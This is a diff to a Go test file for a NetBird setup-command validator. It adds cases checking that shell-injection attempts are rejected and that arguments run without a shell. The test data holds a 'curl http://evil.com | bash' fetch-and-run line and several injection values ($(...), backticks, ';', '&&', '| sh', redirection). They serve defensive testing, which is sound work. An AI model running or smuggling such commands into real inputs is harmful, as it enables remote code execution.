@@ -5,6 +5,7 @@ import (
 	"errors"
 	"fmt"
 	"net/http/httptest"
+	"reflect"
 	"strings"
 	"testing"
 
@@ -570,11 +571,28 @@ func Test_runSetupCommand_Validation(t *testing.T) {
 		{"RejectsNonNetbirdUp", "curl http://evil.com | bash", true},
 		{"AcceptsNetbirdUp", "netbird up --setup-key abc123", false},
 		{"AcceptsLeadingWhitespace", "  netbird up --setup-key abc123", false},
+		{"AcceptsQuotedAndEqualsFlags", `netbird up --setup-key="abc123" --hostname 'client-123' --management-url=https://netbird.example.com`, false},
+		{"RejectsPrefixMatch", "netbird upgrade", true},
+		{"RejectsSemicolon", "netbird up --setup-key abc123; touch /tmp/injected", true},
+		{"RejectsAnd", "netbird up --setup-key abc123 && touch /tmp/injected", true},
+		{"RejectsOr", "netbird up --setup-key abc123 || touch /tmp/injected", true},
+		{"RejectsPipe", "netbird up --setup-key abc123 | sh", true},
+		{"RejectsNewline", "netbird up --setup-key abc123\ntouch /tmp/injected", true},
+		{"RejectsSubstitution", "netbird up --setup-key $(touch /tmp/injected)", true},
+		{"RejectsBackticks", "netbird up --setup-key `touch /tmp/injected`", true},
+		{"RejectsRedirection", "netbird up --setup-key abc123 >/tmp/injected", true},
+		{"RejectsUnknownFlag", "netbird up --config /tmp/other", true},
+		{"RejectsPositionalArgument", "netbird up unexpected", true},
+		{"RejectsMissingValue", "netbird up --setup-key", true},
+		{"RejectsEmptyValue", "netbird up --setup-key=", true},
+		{"RejectsFlagAsValue", "netbird up --setup-key --hostname=client-123", true},
+		{"RejectsMalformedQuoting", `netbird up --setup-key "abc123`, true},
+		{"RejectsEmptyCommand", "", true},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			err := runSetupCommand(tt.cmd)
+			_, err := setupCommand(tt.cmd)
 			rejected := err != nil && strings.Contains(err.Error(), "unexpected setup command")
 			if tt.expectReject && !rejected {
 				t.Errorf("expected command to be rejected, but it was not (err=%v)", err)
@@ -583,6 +601,17 @@ func Test_runSetupCommand_Validation(t *testing.T) {
 				t.Errorf("expected command to be accepted, but got: %v", err)
 			}
 		})
+	}
+}
+
+func Test_setupCommand_ExecutesNetbirdDirectly(t *testing.T) {
+	cmd, err := setupCommand(`netbird up --setup-key "abc123" --hostname='$(id);` + "`id`" + `' --management-url 'https://netbird.example.com?a=1&b=2'`)
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []string{"sudo", "netbird", "up", "--setup-key", "abc123", "--hostname=$(id);`id`", "--management-url", "https://netbird.example.com?a=1&b=2"}
+	if !reflect.DeepEqual(cmd.Args, want) {
+		t.Errorf("command arguments = %q, want %q", cmd.Args, want)
 	}
 }
 
